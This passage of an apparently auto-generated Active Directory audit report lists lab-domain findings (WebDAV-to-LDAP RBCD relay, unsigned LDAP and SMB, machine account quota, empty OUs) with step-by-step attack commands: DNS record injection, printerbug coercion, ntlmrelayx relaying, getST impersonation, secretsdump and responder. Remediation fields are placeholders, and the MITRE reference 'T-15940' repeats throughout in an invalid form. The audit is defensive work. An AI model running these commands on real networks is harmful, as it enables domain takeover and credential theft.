                                                    <p><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/securing-domain-controllers-against-attack#blocking-internet-access-for-domain-controllers">Link 1</a></p>
                                                    <p><a href="https://paularquette.com/lock-down-your-active-directory-domain-controllers-internet-access-part-of-my-active-directory-hardening-series/">Link 2</a></p>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Attack explanation</th>
                                            </tr>
                                            <tr>
                                                <td>
                                                    <div class="attack-container">
                                                        <div class="attack-text">
                                                            <p>1. If unrestricted outbound access is permitted, users can freely access malicious websites such as exploit-db.com.</p>
                                                        </div>
                                                        <span class="image-cell">
                                                            <img src="/Private/Report/Images/MISC/outbound-access-1.png" alt="accessing malicious site">
                                                        </span>
                                                    </div>
                                                    <hr>
                                                    <div class="attack-container">
                                                        <div class="attack-text">
                                                            <p>2. If outbound access is permitted on servers, whilst malicious sites may be blocked by a proxy solution, an attacker could visit third-party sharing sites such as Dropbox, on the domain controller to exfiltrate high volumes of sensitive data with admin access from the network with ease.</p>
                                                        </div>
                                                        <span class="image-cell">
                                                            <img src="/Private/Report/Images/MISC/outbound-access-2.png" alt="accessing non-essential site">
                                                        </span>
                                                    </div>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Remediation (GPT to contextualize)</th>
                                            </tr>
                                            <tr>
                                                <td>
                                                    <p>Restrict or deny outbound access</p>
                                                    <p>run command 1</p>
                                                    <p>run command 2</p>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                            </td>
                        </tr>                <tr>
                                    <td class="toggle" id="Admin-compromise-of-computer-via-WebDAV-to-LDAP-to-RBCD-authentication-relay"><u>Admin compromise of computer via WebDAV to LDAP to RBCD authentication relay</u></td>
                                    <td class="finding-riskHIGH">HIGH</td>
                                </tr>
                                <tr class="finding">
                                    <td colspan="3">
                                        <div class="finding-info">
                                            <table>
                                                <tbody>
                                                    <tr>
                                                        <th>Issue</th>
                                                        <th>MITRE ATT&CK ref</th>
                                                        <th>Score</th>
                                                    </tr>
                                                    <tr><td>The WebClient service running on a device and absence of LDAP signing allows a remote attacker to take control of the machine.</td>                                        <td>T-15940</td>
                                                        <td>+30</td>
                                                    </tr>
                                                </tbody>
                                            </table>
                                            <table>
                                                <tbody>
                                                    <tr>
                                                        <th>Relevant info</th>
                                                        <th>Issue explanation</th>
                                                    </tr>
                                                    <tr>
                                                        <td class="relevantinfo"><table>
                                                            <tr><td class="grey">Number of empty OUs</td><td>DESKTOP-JKTS35O.test.local</td></tr>
                                                            <tr><td class="grey">WebDAV enabled</td><td>True</td></tr>
                                                        </table></td>
                                                        <td class="explanation">
                                                            <p>The WebClient service allows users to connect to WebDAV shares and is commonly seen in organizations that use OneDrive or SharePoint or when mounting drives with a WebDAV connection string. The service is installed by default on Windows 10 machines, however is vulnerable to a 'by-design' authentication coercion bug. Machine account authentication coerced from a machine via WebDAV will use the HTTP protocol, which can be relayed to LDAP (if signing requirements are not enforced) and perform any action that machine has permission to perfrom. Machine accounts have permission to update their own 'msDS-AllowedToActOnBehalfOfOtherIdentity' property meaning that authentication can be coerced, relayed to ldap, then set resource-based constrained delegation on themselves to give a low privileged attacker full control over any machine running the WebClient service.</p>
                                                            <p>WebDAV is enabled on 1 computers and LDAP signing is not required. Each computer actively running the WebClient service can be remotely be fully compromised via a WebDAV HTTP to LDAP to RBCD authentication relay..</p>
                                                            <p class="links"><b>Further information:</b></p>
                                                            <p><a href="https://www.hackingarticles.in/lateral-movement-webclient-workstation-takeover/">Link 1</a></p>
                                                            <p><a href="https://www.fortalicesolutions.com/posts/shadow-credentials-workstation-takeover-edition">Link 2</a></p>
                                                        </td>
                                                    </tr>
                                                </tbody>
                                            </table>
                                            <table>
                                                <tbody>
                                                    <tr>
                                                        <th>Attack explanation</th>
                                                    </tr>
                                                    <tr>
                                                        <td>
                                                            <div class="attack-container">
                                                                <div class="attack-text">
                                                                    <p>1. A low privileged user can check for systems with the WebClient service running (\\<computer>\pipe\DAV RPC SERVICE will be exposed) and also if the domain controller requires ldap signing and channel binding. If not, the computer running the webclient service can be compromised.</p>
                                                                    <p class="code">nxc smb 192.168.10.205 -u test -p 'Password123!' -M webdav</p>
                                                                    <p class="code">nxc ldap dc.test.local -u test -p 'Password123!' -M ldap-checker</p>
                                                                </div>
                                                                <span class="image-cell">
                                                                    <img src="/Private/Report/Images/MISC/webdav-1.png" alt="Finding computers with webclient service enabled">
                                                                </span>
                                                            </div>
                                                            <hr>
                                                            <div class="attack-container">
                                                                <div class="attack-text">
                                                                    <p>2. A DNS record can be added by any low-privileged user to the domain that points to the attack machine (needed for the authentication coercion over HTTP).</p>
                                                                    <p class="code">python3 dnstool.py -u test.local\\test -p 'Password123!' -r attackerDNS.test.local -d 192.168.10.130 --action add dc.test.local</p>
                                                                    <p>A low-privileged user can then add a computer to the domain to provide an account wth an SPN for the frontend service for the RBCD that will be setup over the target server running the WebClient service.</p>
                                                                    <p class="code>impacket-addcomputer -computer-name 'attackerComputer$' -computer-pass 'h4x' test.local/test:'Password123!'</p>
                                                                    <p>A low-privileged user can then coerce machine authentication using RPC from the target machine to the kali machine over http (by specifying @8080).</p>
                                                                    <p class="code>python3 printerbug.py test:'Password123!'@192.168.10.205 attackerDNS@8080/a></p>
                                                                </div>
                                                                <span class="image-cell">
                                                                    <img src="/Private/Report/Images/MISC/webdav-2.png" alt="Setting up webdav relay">
                                                                </span>
                                                            </div>
                                                            <hr>
                                                            <div class="attack-container">
                                                                <div class="attack-text">
                                                                    <p>3. A listener to relay the HTTP authentication is setup to relay the HTTP authentication from the target server to LDAP on the domain controller, to update the 'msDS-AllowedToActOnBehalfOfOtherIdentity' property on the target server with attackerComputer$ (the computer added).</p>
                                                                    <p class="code">sudo impacket-ntlmrelayx -smb2support -t ldaps://dc.test.local --http-port 8080 --delegate-access --escalate-user attackerComputer\$ --no-dump --no-acl --no-da</p>
                                                                </div>
                                                                <span class="image-cell">
                                                                    <img src="/Private/Report/Images/MISC/webdav-3.png" alt="Relaying webdav">
                                                                </span>
                                                            </div>
                                                            <hr>
                                                            <div class="attack-container">
                                                                <div class="attack-text">
                                                                    <p>4. With control of the frontend service (the added attacker computer), an adversary can request a ticket for any service on the backend as they are alloweed to delegte to this service as setup by the HTTP to LDAP relay.</p>
                                                                    <p class="code">impacket-getST -spn cifs/DESKTOP-JKTS35O.test.local test.local/attackerComputer\ -impersonate administrator</p>
                                                                    <p>With a ticket obtained for the backend service, an adversary can remotely extract all the credential matter from the target computer running the WebClient service.</p>
                                                                    <p class="code">export KRB5CCNAME=administrator.ccache</p>
                                                                    <p class="code">impacket-secretsdump -k -no-pass DESKTOP-JKTS35O.test.local</p>
                                                                </div>
                                                                <span class="image-cell">
                                                                    <img src="/Private/Report/Images/MISC/webdav-4.png" alt="Compromising the computer">
                                                                </span>
                                                            </div>
                                                        </td>
                                                    </tr>
                                                </tbody>
                                            </table>
                                            <table>
                                                <tbody>
                                                    <tr>
                                                        <th>Remediation (GPT to contextualize)</th>
                                                    </tr>
                                                    <tr>
                                                        <td>
                                                            <p>Enforce LDAP Signing & channel binding</p>
                                                            <p>run command 1</p>
                                                            <p>run command 2</p>
                                                        </td>
                                                    </tr>
                                                </tbody>
                                            </table>
                                        </div>
                                    </td>
                                </tr>                <tr>
                                    <td class="toggle" id="LDAP-signing-or-channel-binding-is-not-enforced"><u>LDAP signing or channel binding is not enforced</u></td>
                                    <td class="finding-riskMEDIUM">MEDIUM</td>
                                </tr>
                                <tr class="finding">
                                    <td colspan="3">
                                        <div class="finding-info">
                                            <table>
                                                <tbody>
                                                    <tr>
                                                        <th>Issue</th>
                                                        <th>MITRE ATT&CK ref</th>
                                                        <th>Score</th>
                                                    </tr>
                                                    <tr>
                                                        <td>Absence of LDAP signing on domain controllers allows devices to be fully compromised through relay attacks.</td>
                                                        <td>T-15940</td>
                                                        <td>+19</td>
                                                    </tr>
                                                </tbody>
                                            </table>
                                            <table>
                                                <tbody>
                                                    <tr>
                                                        <th>Relevant info</th>
                                                        <th>Issue explanation</th>
                                                    </tr>
                                                    <tr>
                                                        <td class="relevantinfo"><table>
                                                            <tr><td class="grey">Domain Controller</td><td>DC.test.local</td></tr>
                                                            <tr><td class="grey">LDAP Signing</td><td>False</td></tr>
                                                        </table></td>
                                                        <td class="explanation">
                                                            <p>The WebClient service allows users to connect to WebDAV shares and is commonly seen in organizations that use OneDrive or SharePoint or when mounting drives with a WebDAV connection string. The service is installed by default on Windows 10 machines, however is vulnerable to a 'by-design' authentication coercion bug. Machine account authentication coerced from a machine via WebDAV will use the HTTP protocol, which can be relayed to LDAP (if signing requirements are not enforced) and perform any action that machine has permission to perfrom. Machine accounts have permission to update their own 'msDS-AllowedToActOnBehalfOfOtherIdentity' property meaning that authentication can be coerced, relayed to ldap, then set resource-based constrained delegation on themselves to give a low privileged attacker full control over any machine running the WebClient service.</p>
                                                            <p>LDAP bind without SSL was not rejected by DC.test.local.</p>
                                                            <p class="links"><b>Further information:</b></p>
                                                            <p><a href="https://www.hackingarticles.in/lateral-movement-webclient-workstation-takeover/">Link 1</a></p>
                                                            <p><a href="https://www.fortalicesolutions.com/posts/shadow-credentials-workstation-takeover-edition">Link 2</a></p>
                                                        </td>
                                                    </tr>
                                                </tbody>
                                            </table>
                                            <table>
                                                <tbody>
                                                    <tr>
                                                        <th>Attack explanation</th>
                                                    </tr>
                                                    <tr>
                                                        <td>
                                                            <div class="attack-container">
                                                                <div class="attack-text">
                                                                    <p>1. A low privileged user can check for systems with the WebClient service running (\\<computer>\pipe\DAV RPC SERVICE will be exposed) and also if the domain controller requires ldap signing and channel binding. If not, the computer running the webclient service can be compromised.</p>
                                                                    <p class="code">nxc smb 192.168.10.205 -u test -p 'Password123!' -M webdav</p>
                                                                    <p class="code">nxc ldap dc.test.local -u test -p 'Password123!' -M ldap-checker</p>
                                                                </div>
                                                                <span class="image-cell">
                                                                    <img src="/Private/Report/Images/MISC/webdav-1.png" alt="Finding computers with webclient service enabled">
                                                                </span>
                                                            </div>
                                                            <hr>
                                                            <div class="attack-container">
                                                                <div class="attack-text">
                                                                    <p>2. A DNS record can be added by any low-privileged user to the domain that points to the attack machine (needed for the authentication coercion over HTTP).</p>
                                                                    <p class="code">python3 dnstool.py -u test.local\\test -p 'Password123!' -r attackerDNS.test.local -d 192.168.10.130 --action add dc.test.local</p>
                                                                    <p>A low-privileged user can then add a computer to the domain to provide an account wth an SPN for the frontend service for the RBCD that will be setup over the target server running the WebClient service.</p>
                                                                    <p class="code>impacket-addcomputer -computer-name 'attackerComputer$' -computer-pass 'h4x' test.local/test:'Password123!'</p>
                                                                    <p>A low-privileged user can then coerce machine authentication using RPC from the target machine to the kali machine over http (by specifying @8080).</p>
                                                                    <p class="code>python3 printerbug.py test:'Password123!'@192.168.10.205 attackerDNS@8080/a></p>
                                                                </div>
                                                                <span class="image-cell">
                                                                    <img src="/Private/Report/Images/MISC/webdav-2.png" alt="Setting up webdav relay">
                                                                </span>
                                                            </div>
                                                            <hr>
                                                            <div class="attack-container">
                                                                <div class="attack-text">
                                                                    <p>3. A listener to relay the HTTP authentication is setup to relay the HTTP authentication from the target server to LDAP on the domain controller, to update the 'msDS-AllowedToActOnBehalfOfOtherIdentity' property on the target server with attackerComputer$ (the computer added).</p>
                                                                    <p class="code">sudo impacket-ntlmrelayx -smb2support -t ldaps://dc.test.local --http-port 8080 --delegate-access --escalate-user attackerComputer\$ --no-dump --no-acl --no-da</p>
                                                                </div>
                                                                <span class="image-cell">
                                                                    <img src="/Private/Report/Images/MISC/webdav-3.png" alt="Relaying webdav">
                                                                </span>
                                                            </div>
                                                            <hr>
                                                            <div class="attack-container">
                                                                <div class="attack-text">
                                                                    <p>4. With control of the frontend service (the added attacker computer), an adversary can request a ticket for any service on the backend as they are alloweed to delegte to this service as setup by the HTTP to LDAP relay.</p>
                                                                    <p class="code">impacket-getST -spn cifs/DESKTOP-JKTS35O.test.local test.local/attackerComputer\ -impersonate administrator</p>
                                                                    <p>With a ticket obtained for the backend service, an adversary can remotely extract all the credential matter from the target computer running the WebClient service.</p>
                                                                    <p class="code">export KRB5CCNAME=administrator.ccache</p>
                                                                    <p class="code">impacket-secretsdump -k -no-pass DESKTOP-JKTS35O.test.local</p>
                                                                </div>
                                                                <span class="image-cell">
                                                                    <img src="/Private/Report/Images/MISC/webdav-4.png" alt="Compromising the computer">
                                                                </span>
                                                            </div>
                                                        </td>
                                                    </tr>
                                                </tbody>
                                            </table>
                                            <table>
                                                <tbody>
                                                    <tr>
                                                        <th>Remediation (GPT to contextualize)</th>
                                                    </tr>
                                                    <tr>
                                                        <td>
                                                            <p>Enforce LDAP Signing & channel binding</p>
                                                            <p>run command 1</p>
                                                            <p>run command 2</p>
                                                        </td>
                                                    </tr>
                                                </tbody>
                                            </table>
                                        </div>
                                    </td>
                                </tr>        <tr>
                            <td class="toggle" id="SMB-signing-is-not-enforced"><u>SMB signing is not enforced</u></td>
                            <td class="finding-riskMEDIUM">MEDIUM</td>
                        </tr>
                        <tr class="finding">
                            <td colspan="3">
                                <div class="finding-info">
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Issue</th>
                                                <th>MITRE ATT&CK ref</th>
                                                <th>Score</th>
                                            </tr>
                                            <tr>
                                                <td>An unauthenticated attacker can take control of a system through relaying SMB authentication.</td>
                                                <td>T-15940</td>
                                                <td>+19</td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Relevant info</th>
                                                <th>Issue explanation</th>
                                            </tr>
                                            <tr>
                                                <td class="relevantinfo"><table>
                                                    <tr><td class="grey">Computers</td><td>DESKTOP-JKTS35O.test.local<br>CA.test.local</td></tr>
                                                    <tr><td class="grey">SMB Signing</td><td>False</td></tr>
                                                </table></td>
                                                <td class="explanation">
                                                    <p>Server Message Block (SMB) serves as a network file sharing protocol and one security protection is called SMB Signing. When a user seeks access to a shared resource, SMB initiates a connection and authenticates the user. Attackers can intercept this authentication attempt and relay it to a different server to impersonate the user. The lack of SMB’s validation (via SMB signing) of the authentication request’s origin or destination allows attackers to exploit it for unauthorized access. This allows unauthenticated attackers to remotely take control of any system with SMB signing disabled (which is the default for all windows versions except Windows Server 2022 or Windows 11 and newer).</p>
                                                    <p>SMB signing is not enforced on 2 computers meaning SMB authentication can be coerced and relayed to these computers, allowing an unauthenticated attacker to remotely take control of the system..</p>
                                                    <p class="links"><b>Further information:</b></p>
                                                    <p><a href="https://www.blackhillsinfosec.com/an-smb-relay-race-how-to-exploit-llmnr-and-smb-message-signing-for-fun-and-profit/">Link 1</a></p>
                                                    <p><a href="https://tcm-sec.com/smb-relay-attacks-and-how-to-prevent-them/">Link 2</a></p>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Attack explanation</th>
                                            </tr>
                                            <tr>
                                                <td>
                                                    <div class="attack-container">
                                                        <div class="attack-text">
                                                            <p>1. An unauthenticated attacker can discover systems that do not require smb signing by negotiating an smb connection with each.</p>
                                                            <p class="code">nxc smb 192.168.10.0/24 --gen-relay-list smb_hosts_nosigning.txt</p>
                                                        </div>
                                                        <span class="image-cell">
                                                            <img src="/Private/Report/Images/MISC/smbsigning-1.png" alt="finding systems where smb signing is not required">
                                                        </span>
                                                    </div>
                                                    <hr>
                                                    <div class="attack-container">
                                                        <div class="attack-text">
                                                            <p>2. Like in LLMNR poisoning, a user may fail a DNS request by mispelling a file share, which will invoke an LLMNR query to attempt to resolve the hostname on the local LAN.</p>
                                                        </div>
                                                        <span class="image-cell">
                                                            <img src="/Private/Report/Images/MISC/smbsigning-2.png" alt="failing a DNS request">
                                                        </span>
                                                    </div>
                                                    <hr>
                                                    <div class="attack-container">
                                                        <div class="attack-text">
                                                            <p>3. An attacker listening on the local LAN with responder can respond to the LLMNR query, intercepting the SMB request.</p>
                                                            <p class="code">sudo responder -I eth0</p>
                                                        </div>
                                                        <span class="image-cell">
                                                            <img src="/Private/Report/Images/MISC/smbsigning-3.png" alt="poisoning the request">
                                                        </span>
                                                    </div>
                                                    <hr>
                                                    <div class="attack-container">
                                                        <div class="attack-text">
                                                            <p>4. This SMB request can be relayed to eacch of the systems that do not require SMB signing. If the user that's authentication is being relayed has local admin privileges on the target system, all credential matter can be extracted from on the systems the authentication is relayed to and provided to an unauthenticated attacker.</p>
                                                            <p class="code">impacket-ntlmrelayx -tf smb_hosts_nosigning.txt -smb2support</p>
                                                        </div>
                                                        <span class="image-cell">
                                                            <img src="/Private/Report/Images/MISC/smbsigning-4.png" alt="relaying the smb authentication">
                                                        </span>
                                                    </div>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Remediation (GPT to contextualize)</th>
                                            </tr>
                                            <tr>
                                                <td>
                                                    <p>Enforce SMB signing</p>
                                                    <p>run command 1</p>
                                                    <p>run command 2</p>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                            </td>
                        </tr>        <tr>
                            <td class="toggle" id="Potential-for-non-admin-users-can-add-computers-to-the-domain"><u>Potential for non-admin users can add computers to the domain</u></td>
                            <td class="finding-riskLOW">LOW</td>
                        </tr>
                        <tr class="finding">
                            <td colspan="3">
                                <div class="finding-info">
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Issue</th>
                                                <th>MITRE ATT&CK ref</th>
                                                <th>Score</th>
                                            </tr>
                                            <tr><td>Potential for non-admin users to add computers to the domain.</td>                                <td>T-15940</td>
                                                <td>+5</td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Relevant info</th>
                                                <th>Issue explanation</th>
                                            </tr>
                                            <tr>
                                                <td class="relevantinfo"><table>
                                                    <tr><td class="grey">MachineAccountQuota</td><td>10</td></tr>
                                                    <tr><td class="grey">Permission to add workstations</td><td>TEST\machinePermissions</td></tr>
                                                </table></td>
                                                <td class="explanation">
                                                    <p>By default, in Active Directory any authenticated domain user can add a total of 10 computers (machine accounts) to the domain. The number of computers is controlled by the 'ms-DS-MachineAccountQuota' property of the domain, and permission for who can add computers is controlled within the 'Default Domain Controllers Policy' GPO. Computers accounts added by users can be used in attacks such as RBCD or relaying attacks where the computer account can be configured in a way that gives an attacker administrative control by permitting delegation to other critical servers, allowing low-privileged users to escalate their privileges. This default configuration represents a security issue as basic users shouldn't be able to create such accounts and this task should be handled by administrators.</p>
                                                    <p>TEST\machinePermissions can add 10 machines to test.local - check this group is restricted to tier 0 only.</p>
                                                    <p class="links"><b>Further information:</b></p>
                                                    <p><a href="https://www.thehacker.recipes/a-d/movement/domain-settings/machineaccountquota">Link 1</a></p>
                                                    <p><a href="https://sid-500.com/2017/09/09/securing-active-directory-who-can-add-computers-to-the-domain-only-the-domain-admin-are-you-sure/">Link 2</a></p>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Attack explanation</th>
                                            </tr>
                                            <tr>
                                                <td>
                                                    <div class="attack-container">
                                                        <div class="attack-text">
                                                            <p>1. Any low-privileged user can enumerate the 'ms-DS-MachineAccountQuota' property to view how many computers they can add to the domain. By default this is set to 10.</p>
                                                            <p class="code">nxc ldap dc.test.local -u test -p 'Password123!' -M maq</p>
                                                        </div>
                                                        <span class="image-cell">
                                                            <img src="/Private/Report/Images/MISC/MAQ-1.png" alt="Finding the machineaccountquota">
                                                        </span>
                                                    </div>
                                                    <hr>
                                                    <div class="attack-container">
                                                        <div class="attack-text">
                                                            <p>2. Any low-privileged user can add a computer account to the domain choosing the credentials for the computer they desire.</p>
                                                            <p class="code">impacket-addcomputer -computer-name 'attackerComputer$' -computer-pass 'h4x' test.local/test:'Password123!'</p>
                                                            <p>The added computer can be use to authenticate to resources such as file shares just as a low-privileged user can.</p>
                                                            <p class="code">nxc smb dc.test.local -u 'attackerComputer$' -p 'h4x' --shares</p>
                                                        </div>
                                                        <span class="image-cell">
                                                            <img src="/Private/Report/Images/MISC/MAQ-2.png" alt="Adding and using the computer account">
                                                        </span>
                                                    </div>
                                                    <hr>
                                                    <div class="attack-container">
                                                        <div class="attack-text">
                                                            <p>3. The added computer can be seen joined to the domain.</p>
                                                        </div>
                                                        <span class="image-cell">
                                                            <img src="/Private/Report/Images/MISC/MAQ-3.png" alt="Viewing the added machine">
                                                        </span>
                                                    </div>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Remediation (GPT to contextualize)</th>
                                            </tr>
                                            <tr>
                                                <td>
                                                    <p>Change the MAQ to 0</p>
                                                    <p>run command 1</p>
                                                    <p>run command 2</p>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                            </td>
                        </tr>                <tr>
                                    <td class="toggle" id="Domain-effiency-improvement---empty-Organizational-Units"><u>Domain effiency improvement - empty Organizational Units</u></td>
                                    <td class="finding-riskINFORMATIONAL">INFORMATIONAL</td>
                                </tr>
                                <tr class="finding">
                                    <td colspan="3">
                                        <div class="finding-info">
                                            <table>
                                                <tbody>
                                                    <tr>
                                                        <th>Issue</th>
                                                        <th>MITRE ATT&CK ref</th>
                                                        <th>Score</th>
                                                    </tr>
                                                    <tr>
                                                        <td>Empty OUs are unused and add unnecessary complexity to the management of the domain.</td>
                                                        <td>T-15940</td>
                                                        <td>+1</td>
                                                    </tr>
                                                </tbody>
                                            </table>
                                            <table>
                                                <tbody>
                                                    <tr>
                                                        <th>Relevant info</th>
                                                        <th>Issue explanation</th>
                                                    </tr>
                                                    <tr>
                                                        <td class="relevantinfo"><table>
                
                                                            <tr><td class="grey">Number of empty OUs</td><td>37</td></tr>
                                                            <tr><td class="grey">Empty OUs</td><td>OU=layer 5,OU=layer 4,OU=layer 3,OU=layer 2,OU=layer 1,OU=alwaysEmpty,DC=test,DC=local<br>OU=layer 4,OU=layer 3,OU=layer 2,OU=layer 1,OU=alwaysEmpty,DC=test,DC=local<br>OU=layer 3,OU=layer 2,OU=layer 1,OU=alwaysEmpty,DC=test,DC=local<br>OU=layer 2,OU=layer 1,OU=alwaysEmpty,DC=test,DC=local<br>OU=T2-Permissions,OU=Tier 2,OU=Admin,DC=test,DC=local<br>OU=T0-Permissions,OU=Tier 0,OU=Admin,DC=test,DC=local<br>OU=ServiceAccounts,OU=OGC,OU=Tier 1,DC=test,DC=local<br>OU=ServiceAccounts,OU=AWS,OU=Tier 1,DC=test,DC=local<br>OU=ServiceAccounts,OU=FIN,OU=Stage,DC=test,DC=local<br>OU=T2-Accounts,OU=Tier 2,OU=Admin,DC=test,DC=local<br>OU=T0-Servers,OU=Tier 0,OU=Admin,DC=test,DC=local<br>OU=T2-Roles,OU=Tier 2,OU=Admin,DC=test,DC=local<br>OU=Devices,OU=TST,OU=Tier 2,DC=test,DC=local<br>OU=Devices,OU=HRE,OU=Tier 1,DC=test,DC=local<br>OU=Devices,OU=FSR,OU=Tier 1,DC=test,DC=local<br>OU=Groups,OU=TST,OU=Tier 2,DC=test,DC=local<br>OU=Devices,OU=BDE,OU=Stage,DC=test,DC=local<br>OU=Devices,OU=SEC,OU=Stage,DC=test,DC=local<br>OU=Devices,OU=ITS,OU=Stage,DC=test,DC=local<br>OU=Groups,OU=ESM,OU=Tier 2,DC=test,DC=local<br>OU=Groups,OU=FIN,OU=Tier 1,DC=test,DC=local<br>OU=Groups,OU=ESM,OU=Tier 1,DC=test,DC=local<br>OU=Groups,OU=AZR,OU=Tier 1,DC=test,DC=local<br>OU=Groups,OU=AWS,OU=Tier 2,DC=test,DC=local<br>OU=layer 1,OU=alwaysEmpty,DC=test,DC=local<br>OU=Groups,OU=HRE,OU=Stage,DC=test,DC=local<br>OU=Test,OU=FSR,OU=Tier 2,DC=test,DC=local<br>OU=Test,OU=OGC,OU=Tier 1,DC=test,DC=local<br>OU=Test,OU=GOO,OU=Tier 2,DC=test,DC=local<br>OU=Test,OU=TST,OU=Tier 1,DC=test,DC=local<br>OU=Test,OU=FSR,OU=Tier 1,DC=test,DC=local<br>OU=Test,OU=BDE,OU=Tier 1,DC=test,DC=local<br>OU=empty,OU=testOU,DC=test,DC=local<br>OU=Grouper-Groups,DC=test,DC=local<br>OU=ITS,OU=People,DC=test,DC=local<br>OU=TST,OU=People,DC=test,DC=local<br>OU=alwaysEmpty,DC=test,DC=local</td></tr>
                                                        </table></td>
                                                        <td class="explanation">
                                                            <p>In some cases, groups and OUs are empty, yet still remain active in the system, thus making the directory much larger more complex that is needs to be, creating a potential security risk of risk of misconfiguration due to complexity. To minimize management overhead, these empty OUs should be deleted as they take up considerable space in the Domain Controllers due to replication. A cluttered AD environment is difficult to maintain, leads to administrative confusion and decresased effeciency.</p>
                                                            <p>There are 37 empty OUs within the domain. The domain structure can be reduced by approximately 16.02%. Removing complexity eases administration and reduces risk of misconfigurations.</p>
                                                            <p class="links"><b>Further information:</b></p>
                                                            <p><a href="https://www.lepide.com/blog/5-ways-to-keep-your-active-directory-clean/#:~:text=In%20some%20cases%2C%20groups%20and,OUs%20in%20a%20timely%20manner.">Link 1</a></p>
                                                            <p><a href="https://www.n-able.com/blog/active-directory-cleanup-best-practices">Link 2</a></p>
                                                        </td>
                                                    </tr>
                                                </tbody>
                                            </table>
                                            <table>
                                                <tbody>
                                                    <tr>
                                                        <th>Attack explanation</th>
                                                    </tr>
                                                    <tr>
                                                        <td>
                                                            <div class="attack-container">
                                                                <div class="attack-text">
                                                                    <p>1. Empty OUs can be found in ADUC where no object exist under the OU. This adds unecessary completiy and risk that misconfigured objects can lie dormant in many sublayers of OUs.</p>
                                                                </div>
                                                                <span class="image-cell">
                                                                    <img src="/Private/Report/Images/MISC/emptyOU.png" alt="empty OU">
                                                                </span>
                                                            </div>
                                                        </td>
                                                    </tr>
                                                </tbody>
                                            </table>
                                            <table>
                                                <tbody>
                                                    <tr>
                                                        <th>Remediation (GPT to contextualize)</th>
                                                    </tr>
                                                    <tr>
                                                        <td>
                                                            <p>Remove empty OUs</p>
                                                            <p>run command 1</p>
                                                            <p>run command 2</p>
                                                        </td>
                                                    </tr>
                                                </tbody>
                                            </table>
                                        </div>
                                    </td>
                                </tr>                <tr>
                                    <td class="toggle" id="Domain-effiency-improvement---unlinked-GPOs"><u>Domain effiency improvement - unlinked GPOs</u></td>
                                    <td class="finding-riskINFORMATIONAL">INFORMATIONAL</td>
                                </tr>
                                <tr class="finding">
                                    <td colspan="3">
                                        <div class="finding-info">
                                            <table>
                                                <tbody>
                                                    <tr>
                                                        <th>Issue</th>
                                                        <th>MITRE ATT&CK ref</th>
                                                        <th>Score</th>
                                                    </tr>
                                                    <tr>
                                                        <td>Unlinked GPOs are unused and add unnecessary complexity to the management of the domain.</td>
                                                        <td>T-15940</td>
                                                        <td>+1</td>
                                                    </tr>
                                                </tbody>
                                            </table>
                                            <table>
                                                <tbody>
                                                    <tr>
                                                        <th>Relevant info</th>
                                                        <th>Issue explanation</th>
                                                    </tr>
                                                    <tr>
                                                        <td class="relevantinfo"><table>
                
                                                            <tr><td class="grey">Number of unlinked GPOs</td><td>3</td></tr>
                                                            <tr><td class="grey">Unlinked GPOs</td><td>Unlinked GPO2<br>Unlinkedin GPO<br>LAPS - domain computers</td></tr>
                                                        </table></td>
                                                        <td class="explanation">
                                                            <p>Unlinked GPO's, otherwise called orphaned GPOs are not linked to any Active Directory sites, domains, or organizational units (OUs), therefore have no impact and are likely legacy GPOs left over from decomissions. To minimize management overhead, these unlinked GPO's should be deleted as they take up considerable space in the Domain Controllers due to replication. A cluttered AD environment is difficult to maintain, leads to administrative confusion and decresased effeciency.</p>
                                                            <p>There are 3 GPOs not linked to any OUs within the domain. Unlinked GPOs are not used and can be removed to reduce complexity and reduce risk of misconfigurations.</p>
                                                            <p class="links"><b>Further information:</b></p>
                                                            <p><a href="https://www.techcrafters.com/portal/en/kb/articles/powershell-find-delete-empty-gpo-active-directory#Cleaning_up_Unlinked_GPOs_using_PowerShell">Link 1</a></p>
                                                            <p><a href="https://4sysops.com/archives/find-and-delete-unlinked-orphaned-gpos-with-powershell/">Link 2</a></p>
                                                        </td>
                                                    </tr>
                                                </tbody>
                                            </table>
                                            <table>
                                                <tbody>
                                                    <tr>
                                                        <th>Attack explanation</th>
                                                    </tr>
                                                    <tr>
                                                        <td>
                                                            <div class="attack-container">
                                                                <div class="attack-text">
                                                                    <p>1. Unlinked GPOs can be found under the "scope" tab in the GPMC editor where no links are present.</p>
                                                                </div>
                                                                <span class="image-cell">
                                                                    <img src="/Private/Report/Images/MISC/unlinkedGPO.png" alt="unlinked GPO">
                                                                </span>
                                                            </div>
                                                        </td>
                                                    </tr>
                                                </tbody>
                                            </table>
                                            <table>
                                                <tbody>
                                                    <tr>
                                                        <th>Remediation (GPT to contextualize)</th>
                                                    </tr>
                                                    <tr>
                                                        <td>
                                                            <p>Remove unlinked GPOs</p>
                                                            <p>run command 1</p>
                                                            <p>run command 2</p>
                                                        </td>
                                                    </tr>
                                                </tbody>
                                            </table>
                                        </div>
                                    </td>
                                </tr></tbody></table></div>






                                <div class="finding-header">RBAC</div>
        <div class="finding-container">
        <table>
            <thead>
                <tr>
                    <th class="table-header">Issue</th>
                    <th class="table-header">Risk</th>
                </tr>
            </thead>
            <tbody>                <tr>
                    <td class="toggle" id="Print-Operators-group-does-not-meet-the-benchmark-(maximum-0-users)"><u>Print Operators group does not meet the benchmark (maximum 0 users)</u></td>
                    <td class="finding-riskHIGH">HIGH</td>
                </tr>
                <tr class="finding">
